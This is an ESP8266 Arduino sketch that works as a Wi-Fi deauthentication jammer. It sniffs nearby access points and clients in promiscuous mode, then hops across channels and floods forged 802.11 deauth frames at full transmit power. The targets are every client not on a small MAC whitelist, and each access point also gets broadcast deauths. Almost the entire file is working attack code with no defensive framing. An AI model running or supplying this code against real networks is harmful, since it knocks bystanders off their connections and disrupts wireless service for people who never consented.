#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

#define ETH_MAC_LEN 6
#define MAX_APS_TRACKED 100
#define MAX_CLIENTS_TRACKED 200

// Put Your devices here, system will skip them on deauth 2c:0e:3d:00:00:00
#define WHITELIST_LENGTH 2

uint8_t whitelist[WHITELIST_LENGTH][ETH_MAC_LEN] = { { 0x2c, 0x0e, 0x3d, 0x00, 0x00, 0x01 }, {  0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF } };

// Declare to whitelist STATIONs ONLY, otherwise STATIONs and APs can be whitelisted
// If AP is whitelisted, all its clients become automatically whitelisted
// #define WHITELIST_STATION 

// Señal minima para atacar objetivo
signed dBminimo = -69;

// Channel to perform deauth
uint8_t channel = 0;

// Packet buffer
uint8_t packet_buffer[64];

// DeAuth template

// uint8_t template_da[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};

uint8_t template_da[26] = {
0xc0, 0x00, 0x3a, 0x01, 
0x1c, 0x56, 0xfe, 0x1b, 0xde, 0x50, 
0xf8, 0xfb, 0x56, 0x2c, 0xb5, 0xef, 
0xf8, 0xfb, 0x56, 0x2c, 0xb5, 0xef, 
0x00, 0x00, 0x07, 0x00};


uint8_t broadcast1[3] = { 0x01, 0x00, 0x5e };
uint8_t broadcast2[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
uint8_t broadcast3[3] = { 0x33, 0x33, 0x00 };

struct beaconinfo
{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t ssid[33];
  int ssid_len;
  int channel;
  int err;
  signed rssi;
  uint8_t capa[2];
};

struct clientinfo
{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t station[ETH_MAC_LEN];
  uint8_t ap[ETH_MAC_LEN];
  int channel;
  int err;
  signed rssi;
  uint16_t seq_n;
};

beaconinfo aps_known[MAX_APS_TRACKED];                    // Array to save MACs of known APs
int aps_known_count = 0;                                  // Number of known APs
int nothing_new = 0;
clientinfo clients_known[MAX_CLIENTS_TRACKED];            // Array to save MACs of known CLIENTs
int clients_known_count = 0;                              // Number of known CLIENTs

bool friendly_device_found = false;
uint8_t *address_to_check;

struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi)
{
  struct beaconinfo bi;
  bi.ssid_len = 0;
  bi.channel = 0;
  bi.err = 0;
  bi.rssi = rssi;
  int pos = 36;

  if (frame[pos] == 0x00) {
    while (pos < framelen) {
      switch (frame[pos]) {
        case 0x00: //SSID
          bi.ssid_len = (int) frame[pos + 1];
          if (bi.ssid_len == 0) {
            memset(bi.ssid, '\x00', 33);
            break;
          }
          if (bi.ssid_len < 0) {
            bi.err = -1;
            break;
          }
          if (bi.ssid_len > 32) {
            bi.err = -2;
            break;
          }
          memset(bi.ssid, '\x00', 33);
          memcpy(bi.ssid, frame + pos + 2, bi.ssid_len);
          bi.err = 0;  // before was error??
          break;
        case 0x03: //Channel
          bi.channel = (int) frame[pos + 2];
          pos = -1;
          break;
        default:
          break;
      }
      if (pos < 0) break;
      pos += (int) frame[pos + 1] + 2;
    }
  } else {
    bi.err = -3;
  }

  bi.capa[0] = frame[34];
  bi.capa[1] = frame[35];
  memcpy(bi.bssid, frame + 10, ETH_MAC_LEN);

  return bi;
}

struct clientinfo parse_data(uint8_t *frame, uint16_t framelen, signed rssi, unsigned channel)
{
  struct clientinfo ci;
  ci.channel = channel;
  ci.err = 0;
  ci.rssi = rssi;
  int pos = 36;
  uint8_t *bssid;
  uint8_t *station;
  uint8_t *ap;
  uint8_t ds;

  ds = frame[1] & 3;    //Set first 6 bits to 0
  switch (ds) {
    // p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
    case 0:
      bssid = frame + 16;
      station = frame + 10;
      ap = frame + 4;
      break;
    // p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
    case 1:
      bssid = frame + 4;
      station = frame + 10;
      ap = frame + 16;
      break;
    // p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
    case 2:
      bssid = frame + 10;
      // hack - don't know why it works like this...
      if (memcmp(frame + 4, broadcast1, 3) || memcmp(frame + 4, broadcast2, 3) || memcmp(frame + 4, broadcast3, 3)) {
        station = frame + 16;
        ap = frame + 4;
      } else {
        station = frame + 4;
        ap = frame + 16;
      }
      break;
    // p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
    case 3:
      bssid = frame + 10;
      station = frame + 4;
      ap = frame + 4;
      break;

  }

  memcpy(ci.station, station, ETH_MAC_LEN);
  memcpy(ci.bssid, bssid, ETH_MAC_LEN);
  memcpy(ci.ap, ap, ETH_MAC_LEN);

  ci.seq_n = frame[23] * 0xFF + (frame[22] & 0xF0);

  return ci;
}

int register_beacon(beaconinfo beacon)
{
  int known = 0;   // Clear known flag
  for (int u = 0; u < aps_known_count; u++)
  {
    if (! memcmp(aps_known[u].bssid, beacon.bssid, ETH_MAC_LEN)) {
      known = 1;
      break;
    }   // AP known => Set known flag

    if ( beacon.rssi < dBminimo ) {
       known = 1;
       break;
     }
    
  }
    if (! known  )  // AP is NEW, copy MAC to array and return it
  { 
    memcpy(&aps_known[aps_known_count], &beacon, sizeof(beacon));
    aps_known_count++;
    
    if ((unsigned int) aps_known_count >=
        sizeof (aps_known) / sizeof (aps_known[0]) ) {
      Serial.printf("exceeded max aps_known\n");
      aps_known_count = 0;
    }
  }
  return known;
}

int register_client(clientinfo ci)
{
  int known = 0;   // Clear known flag
  for (int u = 0; u < clients_known_count; u++)
  {
    if (! memcmp(clients_known[u].station, ci.station, ETH_MAC_LEN)) {
      known = 1;
      break;
    }
    
     if ( ci.rssi < dBminimo ) {
       known = 1;
       break;
     }

    
  }
  if (! known)
  {
    memcpy(&clients_known[clients_known_count], &ci, sizeof(ci));
    clients_known_count++;

    if ((unsigned int) clients_known_count >=
        sizeof (clients_known) / sizeof (clients_known[0]) ) {
      Serial.printf("exceeded max clients_known\n");
      clients_known_count = 0;
    }
  }
  return known;
}

void print_beacon(beaconinfo beacon)
{
  if (beacon.err != 0) {
    //Serial.printf("BEACON ERR: (%d)  ", beacon.err);
  } else {
    Serial.printf("BEACON: [%32s]  ", beacon.ssid);
    for (int i = 0; i < 6; i++) Serial.printf("%02x", beacon.bssid[i]);
    Serial.printf("   %2d", beacon.channel);
    Serial.printf("   %4d\r\n", beacon.rssi);
  }
}

void print_client(clientinfo ci)
{
  int u = 0;
  int known = 0;   // Clear known flag
  if (ci.err != 0) {
  } else {
    Serial.printf("CLIENT: ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.station[i]);
    Serial.printf(" works with: ");
    for (u = 0; u < aps_known_count; u++)
    {
      if (! memcmp(aps_known[u].bssid, ci.bssid, ETH_MAC_LEN)) {
        Serial.printf("[%32s]", aps_known[u].ssid);
        known = 1;
        break;
      }   // AP known => Set known flag
    }
    if (! known)  {
      Serial.printf("%22s", " ");
      for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.bssid[i]);
    }

    Serial.printf("%5s", " ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.ap[i]);
    Serial.printf("%5s", " ");

    if (! known) {
      Serial.printf("   %3d", ci.channel);
    } else {
      Serial.printf("   %3d", aps_known[u].channel);
    }
    Serial.printf("   %4d\r\n", ci.rssi);
  }
}

/* ==============================================
   Promiscous callback structures, see ESP manual
   ============================================== */

struct RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};

struct LenSeq {
  uint16_t length;
  uint16_t seq;
  uint8_t  address3[6];
};

struct sniffer_buf {
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  struct LenSeq lenseq[1];
};

struct sniffer_buf2 {
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};


/* Creates a packet.

   buf - reference to the data array to write packet to;
   client - MAC address of the client;
   ap - MAC address of the acces point;
   seq - sequence number of 802.11 packet;

   Returns: size of the packet
*/
uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq)
{
  int i = 0;
  
  memcpy(buf, template_da, 26);
  // Destination 
  memcpy(buf + 4, c, ETH_MAC_LEN);
  // Sender 
  memcpy(buf + 10, ap, ETH_MAC_LEN);
  // BSS 
  memcpy(buf + 16, ap, ETH_MAC_LEN);
  // Seq_n
  buf[22] = seq % 0xFF;
  buf[23] = seq / 0xFF;

  return 26;
  
}

/* Sends deauth packets. */
void deauth(uint8_t *c, uint8_t *ap, uint16_t seq)
{
  uint8_t i = 0;
  uint16_t sz = 0;

  for (i = 0; i < 0x10; i++) {
    sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i);
    //PrintHex8(packet_buffer,sz);
    wifi_send_pkt_freedom(packet_buffer, sz, 0);
    
    delay(1);
  }
}

void promisc_cb(uint8_t *buf, uint16_t len)
{
  int i = 0;
  uint16_t seq_n_new = 0;
  if (len == 12) {
    struct RxControl *sniffer = (struct RxControl*) buf;
  } else if (len == 128) {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    struct beaconinfo beacon = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
    if ( beacon.rssi > dBminimo ) { 
    
            if (register_beacon(beacon) == 0) {
              print_beacon(beacon);
              nothing_new = 0;
                                              }
    }


    
  } else {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    //Is data or QOS?
    if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88)) {
      struct clientinfo ci = parse_data(sniffer->buf, 36, sniffer->rx_ctrl.rssi, sniffer->rx_ctrl.channel);
         
                                  if (memcmp(ci.bssid, ci.station, ETH_MAC_LEN)) {
                                    if (register_client(ci) == 0) {
                                      print_client(ci);
                                      nothing_new = 0;
                                    }
                                  }
                                  
    }
  }
}

bool check_whitelist(uint8_t *macAdress){
  unsigned int i=0;
  for (i=0; i<WHITELIST_LENGTH; i++) {
    if (! memcmp(macAdress, whitelist[i], ETH_MAC_LEN)) return true;
  }
  return false;
}

void setup() {
  Serial.begin(115200);
  Serial.print("\n\n\n");
  Serial.printf("\n\nSDK version:%s\n", system_get_sdk_version());
  Serial.print("\nMacAddress:");
  Serial.println(WiFi.macAddress());
  Serial.print("\n\n\n");
  
  // Promiscuous works only with station mode
  wifi_set_opmode(STATION_MODE);

  // Set up promiscuous callback
  wifi_set_channel(1);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);
  system_phy_set_rfoption(1);
  system_phy_set_max_tpw(82); // WiFi.setOutputPower(82);
  
}

void loop() {
  while (true) {

    channel = 1;
    wifi_set_channel(channel);
    while (true) {
      nothing_new++;
      if (nothing_new > 200) {
        nothing_new = 0;

        wifi_promiscuous_enable(0);
        wifi_set_promiscuous_rx_cb(0);
        wifi_promiscuous_enable(1);
        
        for (int ua = 0; ua < aps_known_count; ua++) {
          if (aps_known[ua].channel == channel) {
            for (int uc = 0; uc < clients_known_count; uc++) {
              if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN)) {
#ifdef WHITELIST_STATION
                address_to_check = clients_known[uc].station;
#else
                address_to_check = clients_known[uc].ap;
#endif
                if (check_whitelist(address_to_check)) {
                  friendly_device_found = true;
                  Serial.print("Whitelisted -->");
                  print_client(clients_known[uc]);
                } else {
                  Serial.print("DeAuth to ---->");
                  print_client(clients_known[uc]);
                  deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
                }
                break;
              }
            }
            if (!friendly_device_found) deauth(broadcast2, aps_known[ua].bssid, 128);
            friendly_device_found = false;
          }
        }
        wifi_promiscuous_enable(0);
        wifi_set_promiscuous_rx_cb(promisc_cb);
        wifi_promiscuous_enable(1);

        channel++;
        if (channel == 14) break;
        wifi_set_channel(channel);
      }
      delay(1);

      if ((Serial.available() > 0) && (Serial.read() == '\n')) {
        Serial.println("\n-------------------------------------------------------------------------\n");
        for (int u = 0; u < aps_known_count; u++) print_beacon(aps_known[u]);
        for (int u = 0; u < clients_known_count; u++) print_client(clients_known[u]);
        Serial.println("\n-------------------------------------------------------------------------\n");
      }
    }
  }
}


void PrintHex8(uint8_t *data, uint8_t length) // prints 8-bit data in hex
{
     char tmp[length*5+1];
     byte first;
     byte second;
     for (int i=0; i<length; i++) {
           first = (data[i] >> 4) & 0x0f;
           second = data[i] & 0x0f;
           // base for converting single digit numbers to ASCII is 48
           // base for 10-16 to become upper-case characters A-F is 55
           // note: difference is 7
           tmp[i*5] = 48; // add leading 0
           tmp[i*5+1] = 120; // add leading x
           tmp[i*5+2] = first+48;
           tmp[i*5+3] = second+48;
           tmp[i*5+4] = 32; // add trailing space
           if (first > 9) tmp[i*5+2] += 7;
           if (second > 9) tmp[i*5+3] += 7;
     }
     tmp[length*5] = 0;
     Serial.println(tmp);
}


void __attribute__((weak)) 
user_rf_pre_init(void)
{
    // Warning: IF YOU DON'T KNOW WHAT YOU ARE DOING, DON'T TOUCH THESE CODE

    // Control RF_CAL by esp_init_data_default.bin(0~127byte) 108 byte when wakeup
    // Will low current
    // system_phy_set_rfoption(0)；

    // Process RF_CAL when wakeup.
    // Will high current
    system_phy_set_rfoption(1);

    // Set Wi-Fi Tx Power, Unit: 0.25dBm, Range: [0, 82]
    system_phy_set_max_tpw(82);
}
